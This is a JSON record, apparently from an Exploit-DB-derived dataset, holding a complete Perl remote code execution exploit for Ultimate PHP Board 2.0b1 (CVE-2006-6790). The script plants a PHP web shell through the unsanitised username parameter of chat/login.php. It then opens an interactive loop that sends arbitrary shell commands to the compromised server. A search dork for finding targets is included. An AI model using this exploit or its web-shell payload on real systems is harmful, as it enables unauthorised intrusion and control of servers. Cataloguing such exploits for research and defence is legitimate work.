{
  "id": "2999",
  "title": "Ultimate PHP Board 2.0b1 - &#039;/chat/login.php&#039; Code Execution",
  "cve": "CVE-2006-6790",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n# +-------------------------------------------------------------------------------------------\r\n# + Ultimate PHP Board <= 2.0b1 (chat/login.php) Remote Code Execution Vulnerability\r\n# +-------------------------------------------------------------------------------------------\r\n# + Affected Software .: Ultimate PHP Board (myUPB) <= 2.0b1\r\n# + Vendor ............: http://www.myupb.com/\r\n# + Download ..........: http://fileserv.myupb.com/upb2.0B1.zip\r\n# + Description .......: \"Ultimate PHP Board is a free discussion forum that can be used as a free alternative to UBB or vBulletin\"\r\n# + Dork ..............: \"Powered by UPB\"\r\n# + Class .............: Remote Code Execution\r\n# + Risk ..............: High (Remote Code Execution)\r\n# + Found By ..........: nuffsaid <nuffsaid[at]newbslove.us>\r\n# +-------------------------------------------------------------------------------------------\r\n# + Details:\r\n# + Ultimate PHP Board chat/login.php does not sanatize the $username ($_GET[\"username\"])\r\n# + variable before writing it to chat/text.php on line 28, arbitrary php code can be written\r\n# + then executed by visiting chat/text.php.\r\n# +\r\n# + Vulnerable Code: \r\n# + chat/login.php, line(s) 23-28:\r\n# + -> 23: $filename = \"text.php\";\r\n# + -> 24: $fileAr= file($filename);\r\n# + -> 25: exec(\"cat /dev/null > '$filename'\");\r\n# + -> 26: $fd = fopen( $filename, \"a+\" );\r\n# + -> 27: $filemessage = \"<font size='$font_s' face='$font_face' color='$font_color_main'><b>$username entered at $date</b></font><br>\\n\";\r\n# + -> 28: fputs($fd,$filemessage);\r\n# +\r\n# + Proof of Concept:\r\n# + http://[target]/[path]/chat/login.php?option=chat&username=[code]\r\n# + http://[target]/[path]/chat/text.php\r\n# +-------------------------------------------------------------------------------------------\r\n\r\nuse Getopt::Long;\r\nuse URI::Escape;\r\nuse IO::Socket;\r\n\r\n$code = \"<?php if (isset(\\$_GET[cmd])) passthru(\\$_GET[cmd]); die; ?>\";\r\n\r\nmain();\r\n\r\nsub usage\r\n{\r\n    print \"\\nUltimate PHP Board <= 2.0b1 Remote Code Execution Exploit\\n\";\r\n    print \"nuffsaid <nuffsaid[at]newbslove.us>\\n\";\r\n    print \"-h, --host\\ttarget host\\t(example.com)\\n\";\r\n    print \"-d, --dir\\tinstall dir\\t(/forum)\\n\";\r\n    exit;\r\n}\r\n\r\nsub main\r\n{\r\n    GetOptions ('h|host=s' => \\$host,'d|dir=s' => \\$dir);\r\n    usage() unless $host;\r\n    $dir = \"/forum\" unless $dir;\r\n    $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n     or die \"\\nconnect() failed.\\n\";\r\n    \r\n    print \"\\nconnected to \".$host.\", sending data.\\n\";\r\n    $sendurl = uri_escape($code);\r\n    print $sock \"GET \".$dir.\"/chat/login.php?option=chat&username=\".$sendurl.\" HTTP/1.1\\n\";\r\n    print $sock \"Host: \".$host.\"\\n\";\r\n    print $sock \"Accept: */*\\n\";\r\n    print $sock \"Connection: close\\n\\n\";\r\n    print \"\\n\";\r\n    print \"attempted to create php shell, server response:\\n\\n\";\r\n    while($recvd = <$sock>)\r\n    {\r\n        print \" \".$recvd.\"\";\r\n    }\r\n    \r\n    while($cmd !~ \"~quit\")\r\n    {\r\n        print \"\\n\\n-> \";\r\n        $cmd = <STDIN>;\r\n        if ($cmd !~ \"~quit\")\r\n        {\r\n          $sock = IO::Socket::INET->new(Proto=>\"tcp\",PeerAddr=>\"$host\",PeerPort=>\"80\")\r\n           or die \"connect() failed.\\n\";\r\n          $sendurl = uri_escape($cmd);\r\n          print $sock \"GET \".$dir.\"/chat/text.php?cmd=\".$sendurl.\" HTTP/1.1\\n\";\r\n          print $sock \"Host: \".$host.\"\\n\";\r\n          print $sock \"Accept: */*\\n\";\r\n          print $sock \"Connection: close\\n\\n\";\r\n          print \"\\n\";\r\n          while($recvd = <$sock>)\r\n          {\r\n              print $recvd;\r\n          }\r\n        }\r\n    }\r\n    exit;\r\n}\r\n\r\n# milw0rm.com [2006-12-24]",
  "url": "https://www.exploit-db.com/exploits/2999"
}